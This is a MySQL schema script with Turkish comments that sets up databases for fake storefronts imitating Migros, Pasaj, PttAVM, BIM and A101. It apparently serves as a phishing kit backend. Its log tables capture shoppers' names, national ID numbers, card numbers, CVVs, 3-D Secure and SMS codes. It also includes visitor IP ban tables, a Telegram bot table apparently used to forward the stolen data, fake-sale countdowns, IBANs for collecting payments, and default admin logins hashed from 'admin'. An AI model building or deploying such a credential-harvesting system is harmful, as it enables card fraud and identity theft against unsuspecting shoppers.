-- Yeni pazaryeri modülleri (jakartaxdw): Migros, Pasaj2, PttAVM alt, Bim online, A101 havale
-- Çalıştır: mysql -u ... jakartaxdw < bella_yeni_pazaryeri_tablolar.sql

SET NAMES utf8mb4;

-- ========== Migros (migros/) ==========
CREATE TABLE IF NOT EXISTS `bella_mg_admin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `admin` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_mg_banka` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bankaisim` varchar(255) NOT NULL,
  `iban` varchar(255) NOT NULL,
  `ibanisim` varchar(255) NOT NULL,
  `aciklama` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_mg_kategori` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `isim` varchar(255) NOT NULL,
  `link` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_mg_logs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `tur` varchar(255) DEFAULT NULL,
  `isimsoyisim` varchar(255) DEFAULT NULL,
  `postakodu` varchar(255) DEFAULT NULL,
  `telefon` varchar(255) DEFAULT NULL,
  `adresbasligi` varchar(255) DEFAULT NULL,
  `tc` varchar(255) DEFAULT NULL,
  `kartsahip` varchar(255) NOT NULL,
  `kart` varchar(255) DEFAULT NULL,
  `karttarih` varchar(255) DEFAULT NULL,
  `kartcvv` varchar(255) DEFAULT NULL,
  `adres` varchar(255) DEFAULT NULL,
  `dekont` varchar(255) DEFAULT NULL,
  `sms` varchar(255) DEFAULT NULL,
  `hsms` varchar(255) DEFAULT NULL,
  `durum` varchar(255) NOT NULL DEFAULT 'bekle',
  `zaman` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_mg_urunler` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `urunismi` varchar(255) NOT NULL,
  `urunlink` varchar(255) DEFAULT NULL,
  `urunkat` varchar(255) DEFAULT NULL,
  `resim1` varchar(255) DEFAULT NULL,
  `resim2` varchar(255) DEFAULT NULL,
  `resim3` varchar(255) DEFAULT NULL,
  `resim4` varchar(255) DEFAULT NULL,
  `resim5` varchar(255) DEFAULT NULL,
  `fiyat` varchar(255) DEFAULT NULL,
  `urunkodu` varchar(255) NOT NULL DEFAULT '',
  `hakkinda` longtext DEFAULT NULL,
  `ozellik` longtext DEFAULT NULL,
  `iban` varchar(255) DEFAULT NULL,
  `ekleyen` varchar(128) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_mg_urunlink` (`urunlink`(191))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ========== Pasaj2 (pasaj2/) ==========
CREATE TABLE IF NOT EXISTS `bella_pj_admin` LIKE `bella_mg_admin`;
CREATE TABLE IF NOT EXISTS `bella_pj_banka` LIKE `bella_mg_banka`;
CREATE TABLE IF NOT EXISTS `bella_pj_kategori` LIKE `bella_mg_kategori`;
CREATE TABLE IF NOT EXISTS `bella_pj_logs` LIKE `bella_mg_logs`;

CREATE TABLE IF NOT EXISTS `bella_pj_urunler` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `urunismi` varchar(255) NOT NULL,
  `urunlink` varchar(255) DEFAULT NULL,
  `urunkat` varchar(255) DEFAULT NULL,
  `resim1` varchar(255) DEFAULT NULL,
  `resim2` varchar(255) DEFAULT NULL,
  `resim3` varchar(255) DEFAULT NULL,
  `resim4` varchar(255) DEFAULT NULL,
  `resim5` varchar(255) DEFAULT NULL,
  `fiyat` varchar(255) DEFAULT NULL,
  `urunkodu` varchar(255) NOT NULL DEFAULT '',
  `hakkinda` longtext DEFAULT NULL,
  `ozellik` longtext DEFAULT NULL,
  `iban` varchar(255) DEFAULT NULL,
  `kat1` varchar(255) DEFAULT NULL,
  `kat2` varchar(255) DEFAULT NULL,
  `kat3` varchar(255) DEFAULT NULL,
  `saticiadi` varchar(255) DEFAULT NULL,
  `ekleyen` varchar(128) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_pj_urunlink` (`urunlink`(191))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ========== PttAVM alt (pttavm_alt/) ==========
CREATE TABLE IF NOT EXISTS `bella_ptt3_admin` LIKE `bella_mg_admin`;
CREATE TABLE IF NOT EXISTS `bella_ptt3_banka` LIKE `bella_mg_banka`;
CREATE TABLE IF NOT EXISTS `bella_ptt3_kategori` LIKE `bella_mg_kategori`;
CREATE TABLE IF NOT EXISTS `bella_ptt3_logs` LIKE `bella_mg_logs`;

CREATE TABLE IF NOT EXISTS `bella_ptt3_urunler` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `urunismi` varchar(255) NOT NULL,
  `urunlink` varchar(255) DEFAULT NULL,
  `urunkat` varchar(255) DEFAULT NULL,
  `resim1` varchar(255) DEFAULT NULL,
  `resim2` varchar(255) DEFAULT NULL,
  `resim3` varchar(255) DEFAULT NULL,
  `resim4` varchar(255) DEFAULT NULL,
  `resim5` varchar(255) DEFAULT NULL,
  `fiyat` varchar(255) DEFAULT NULL,
  `urunkodu` varchar(255) NOT NULL DEFAULT '',
  `hakkinda` longtext DEFAULT NULL,
  `ozellik` longtext DEFAULT NULL,
  `iban` varchar(255) DEFAULT NULL,
  `ekleyen` varchar(128) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_ptt3_urunlink` (`urunlink`(191))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ========== Bim online (bim_online/) — kaynak: bim_sql.sql ==========
CREATE TABLE IF NOT EXISTS `bella_bim_admins` (
  `id` bigint(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_bim_bans` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ipaddr` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_bim_basket` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `product_name` text DEFAULT NULL,
  `ip_address` varchar(255) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `is_warn` int(11) DEFAULT 1,
  PRIMARY KEY (`id`),
  KEY `idx_bim_basket_ip` (`ip_address`(64))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_bim_ips` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip_addr` varchar(255) DEFAULT NULL,
  `status` text DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_bim_logs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `cardholder_name` text DEFAULT NULL,
  `cardholder_phone` varchar(255) DEFAULT NULL,
  `card_number` bigint(16) DEFAULT NULL,
  `card_expiration_month` int(11) DEFAULT NULL,
  `card_expiration_year` int(11) DEFAULT NULL,
  `card_cvv` varchar(255) DEFAULT NULL,
  `card_3dcode` varchar(255) DEFAULT NULL,
  `secure_code` varchar(255) DEFAULT NULL,
  `status` int(11) DEFAULT NULL,
  `ipaddr` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `amount` bigint(20) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_bim_products` (
  `id` bigint(11) NOT NULL AUTO_INCREMENT,
  `ProductName` varchar(255) DEFAULT NULL,
  `ImageURL` text DEFAULT NULL,
  `ProductSefURL` text DEFAULT NULL,
  `ProductPrice` int(11) DEFAULT NULL,
  `ProductProperties` text DEFAULT NULL,
  `ProductBrand` varchar(255) DEFAULT NULL,
  `ProductCode` bigint(11) DEFAULT NULL,
  `ekleyen` varchar(128) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_bim_sef` (`ProductSefURL`(191))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_bim_settings` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `data` datetime NOT NULL,
  `isActive` tinyint(1) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT IGNORE INTO `bella_bim_settings` (`id`, `data`, `isActive`) VALUES (1, NOW(), 0);

INSERT IGNORE INTO `bella_bim_admins` (`id`, `username`, `password`) VALUES (1, 'admin', 'd4826b7c305b81a2141cdf18568c582c4ea04061ee2fa24a87186120e9581b7e');

-- ========== A101 havale — kaynak: a101havale.sql ==========
CREATE TABLE IF NOT EXISTS `bella_a101_admins` (
  `id` bigint(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_a101_banks` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bank_logo` text NOT NULL,
  `bank_name` varchar(255) NOT NULL,
  `iban` varchar(255) NOT NULL,
  `name_surname` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_a101_bans` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ipaddr` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_a101_basket` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `product_name` text DEFAULT NULL,
  `ip_address` varchar(255) DEFAULT NULL,
  `address` text DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `is_warn` int(11) DEFAULT 1,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_a101_countdown` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `countdown_date` varchar(64) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT IGNORE INTO `bella_a101_countdown` (`id`, `countdown_date`) VALUES (1, DATE_FORMAT(DATE_ADD(NOW(), INTERVAL 7 DAY), '%Y-%m-%d %H:%i:%s'));

CREATE TABLE IF NOT EXISTS `bella_a101_ips` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ipaddr` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_a101_logs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name_surname` varchar(255) DEFAULT NULL,
  `ipAddress` varchar(255) NOT NULL,
  `phone_number` varchar(255) DEFAULT NULL,
  `il` varchar(255) DEFAULT NULL,
  `address` varchar(255) DEFAULT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_a101_makbuz` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `receipt` text DEFAULT NULL,
  `ip_address` varchar(255) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_a101_products` (
  `id` bigint(11) NOT NULL AUTO_INCREMENT,
  `ProductName` varchar(255) DEFAULT NULL,
  `ImageURL` text,
  `Image2URL` text,
  `Image3URL` text,
  `Image4URL` text,
  `ProductSefURL` text,
  `ProductPrice` int(11) DEFAULT NULL,
  `ProductProperties` text,
  `ProductBrand` varchar(255) DEFAULT NULL,
  `ProductCode` bigint(11) DEFAULT NULL,
  `ekleyen` varchar(128) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_a101_sef` (`ProductSefURL`(191))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `bella_a101_settings` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `isActive` tinyint(1) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT IGNORE INTO `bella_a101_settings` (`id`, `isActive`) VALUES (1, 0);

CREATE TABLE IF NOT EXISTS `bella_a101_telegram_bot` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bot_token` varchar(255) DEFAULT NULL,
  `chat_id` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT IGNORE INTO `bella_a101_telegram_bot` (`id`, `bot_token`, `chat_id`) VALUES (1, '', '');

CREATE TABLE IF NOT EXISTS `bella_a101_ziyaretci_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip_address` varchar(255) NOT NULL,
  `log_message` varchar(255) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT IGNORE INTO `bella_a101_admins` (`id`, `username`, `password`) VALUES (1, 'admin', '8bb0cf6eb9b17d0f7d22b456f121257dc1254e1f01665370476383ea776df414');
INSERT IGNORE INTO `bella_a101_banks` (`id`, `bank_logo`, `bank_name`, `iban`, `name_surname`) VALUES (1, 'placeholder.png', 'AKBANK', 'TR00 0000 0000 0000 0000 0000 00', 'Demo Alıcı');

-- Örnek admin (Migros/Pasaj/Ptt: şifre SHA1 'admin' = d033e22ae348aeb5660fc2140aec35850c4da997 — kaynak SQL ile aynı)
INSERT IGNORE INTO `bella_mg_admin` (`id`, `admin`, `password`) VALUES (1, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997');
INSERT IGNORE INTO `bella_pj_admin` (`id`, `admin`, `password`) VALUES (1, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997');
INSERT IGNORE INTO `bella_ptt3_admin` (`id`, `admin`, `password`) VALUES (1, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997');

INSERT IGNORE INTO `bella_mg_banka` (`id`, `bankaisim`, `iban`, `ibanisim`, `aciklama`) VALUES (1, 'garanti', 'TR11 1111 1111 1111 1111', 'İBAN İSİM', 'Test');
INSERT IGNORE INTO `bella_pj_banka` (`id`, `bankaisim`, `iban`, `ibanisim`, `aciklama`) VALUES (1, 'garanti', 'TR11 1111 1111 1111 1111', 'İBAN İSİM', 'Test');
INSERT IGNORE INTO `bella_ptt3_banka` (`id`, `bankaisim`, `iban`, `ibanisim`, `aciklama`) VALUES (1, 'garanti', 'TR11 1111 1111 1111 1111', 'İBAN İSİM', 'Test');

INSERT IGNORE INTO `bella_mg_kategori` (`id`, `isim`, `link`) VALUES
(1, 'Elektronik', 'elektronik'),(2, 'Moda', 'moda'),(3, 'Kozmetik', 'kozmetik'),(4, 'Beyaz Eşya', 'beyaz-esya'),
(7, 'Anne & Çocuk', 'anne-cocuk'),(8, 'Ev & Yaşam', 'ev-yasam'),(9, 'Süpermarket', 'supermarket'),
(10, 'TV & Görüntü', 'tv-goruntu'),(11, 'Bilgisayar & Tablet', 'bilgisayar-tablet'),
(12, 'Spor & Outdoor', 'spor-outdoor'),(13, 'Motorsiklet', 'motorsiklet-modelleri'),
(14, 'Mobilya', 'mobilya'),(15, 'Cep Telefonu', 'cep-telefonu');

INSERT IGNORE INTO `bella_pj_kategori` SELECT * FROM `bella_mg_kategori`;
INSERT IGNORE INTO `bella_ptt3_kategori` SELECT * FROM `bella_mg_kategori`;
